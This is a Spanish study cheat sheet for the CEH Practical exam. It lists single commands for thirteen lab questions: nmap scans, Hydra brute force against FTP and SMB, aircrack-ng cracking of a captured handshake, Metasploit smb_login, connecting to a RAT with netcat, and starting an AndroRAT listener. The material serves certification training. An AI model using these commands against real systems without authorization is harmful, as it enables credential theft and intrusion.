# CEH Practical – RESUMEN
---

### 1) Identificar versión del producto del Domain Controller (escaneo extenso de red)
```
nmap -A [IP o rango, ej 10.10.1.0/24]
```
Busca en el output la línea de **Host script results** o el puerto 389/636 (LDAP) / 88 (Kerberos) — nmap suele reportar directamente "Product:" en el banner del DC (ej. Windows Server 2019/2022 Domain Controller). Si no sale directo:
```
nmap -p 389 --script ldap-rootdse [IP DC]
```

---

### 2) OS de la máquina que corre MySQL
Primero encuentra el puerto 3306 abierto, luego version/OS detection:
```
nmap -sV -O -p 3306 [IP]
```
El campo `-O` da el OS; `-sV` da la versión de MySQL, que muchas veces revela el sistema (ej. "MySQL 5.5.5-10.x — (Ubuntu)").

---

### 3) Contraseña de usuario X en FTP
Fuerza bruta con Hydra (necesitas una wordlist, ej. rockyou.txt):
```
hydra -l <usuario> -P /usr/share/wordlists/rockyou.txt ftp://[IP]
```
Si el usuario también es desconocido, usa `-L` con una lista de usuarios en vez de `-l`.

---

### 4) Número de teléfono del empleado
Esto es **footprinting/OSINT**, no técnico. Usa:
```
theHarvester -d <dominio> -b all
```
o revisa el sitio web/whois/redes sociales de la organización (LinkedIn, sitio "About us", metadata de documentos PDF con `exiftool`). En los labs del Módulo 02 esto se resuelve navegando el sitio web objetivo o usando recon-ng.

---

### 5) Descifrar contraseña de Rogue AP con capture.cap
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture.cap
```
Si hay varias redes en el cap, aircrack te pedirá elegir el número correspondiente al SSID del Rogue AP.

---

### 6) Descifrar archivo de volumen con VeraCrypt
Por GUI: abre VeraCrypt → **Select File** → elige el volumen → **Mount** → prueba contraseñas (si te dan wordlist, VeraCrypt no hace bruteforce nativo por CLI fácilmente en el lab; normalmente te dan la contraseña o un hint directo). Si es por CLI:
```
veracrypt --text --mount <archivo_volumen> <punto_montaje> --password=<password>
```

---

### 7) Conectarse remotamente vía RDP con credenciales
Desde Linux:
```
xfreerdp /u:<usuario> /p:<contraseña> /v:[IP destino]
```
Desde Windows: `mstsc` → ingresar IP → usuario/contraseña.

---

### 8) Descubrir RAT en la red y acceder a la PC para recovery secret.txt
1. Escanea puertos sospechosos (RATs suelen usar puertos altos no estándar):
```
nmap -p- -sV [IP]
```
2. Conéctate al puerto del RAT (netcat suele bastar si es un listener simple):
```
nc [IP] [puerto detectado]
```
3. Una vez dentro de la shell, navega y extrae el archivo:
```
cd Desktop
cat secret.txt
```
(o usa el propio cliente del RAT si el lab usa uno específico, ej. AndroRAT/njRAT — revisa qué herramienta cliente te dan en el lab).

---

### 9) Contraseña de usuario vía servicio SMB
Enumeración primero:
```
enum4linux -a [IP]
```
Luego fuerza bruta:
```
hydra -l <usuario> -P /usr/share/wordlists/rockyou.txt smb://[IP]
```
O con Metasploit:
```
msfconsole
use auxiliary/scanner/smb/smb_login
set RHOSTS [IP]
set USER_FILE users.txt
set PASS_FILE rockyou.txt
run
```

---

### 10) Escaneo/enumeración extensa — contar servicios "mercury" en el servidor
```
nmap -A -p- [IP]
```
Busca en el output todas las líneas con el string `Mercury` (es un mail/FTP server conocido — Mercury Mail Transport System). Cuenta cuántos puertos/servicios reportan ese banner.

---

### 11) Número de CVE de una vulnerabilidad
1. Identifica servicio y versión:
```
nmap -sV [IP]
```
2. Busca el CVE asociado a esa versión:
```
searchsploit <nombre_servicio> <versión>
```
O usa un vulnerability scanner:
```
nmap --script vuln [IP]
```
El script vuln de nmap frecuentemente imprime el CVE directamente en el resultado.

---

### 12) Usuario/contraseña en texto plano dentro de un archivo .pcap
Abre en Wireshark y sigue el flujo TCP del protocolo en texto claro (FTP, HTTP, Telnet):
```
wireshark archivo.pcap
```
Filtro útil:
```
ftp || http.request || telnet
```
Clic derecho sobre el paquete → **Follow → TCP Stream** para ver usuario/contraseña en claro.

Alternativa por CLI:
```
tshark -r archivo.pcap -Y "ftp.request.command==USER or ftp.request.command==PASS"
```

---

### 13) Extraer información de tarjeta SD de un dispositivo Android
Con ADB (si tienes acceso físico/shell al dispositivo):
```
adb devices
adb shell
ls /sdcard/
adb pull /sdcard/ ./sdcard_extraida/
```
Si es vía un RAT tipo AndroRAT (como en el Módulo 17 que ya vimos):
```
python3 androRAT.py --shell -i 0.0.0.0 -p 4444
```
y desde su consola interactiva usar el comando de listado/descarga de archivos que ofrezca el menú `help`.

---

**Nota general:** en el Practical estas preguntas casi siempre son un solo comando + leer el output con atención (el dato pedido suele estar ahí, no requiere pasos extra). Prioriza `nmap -A` / `-sV` / `--script vuln` como primer movimiento en la mayoría de preguntas de reconocimiento.
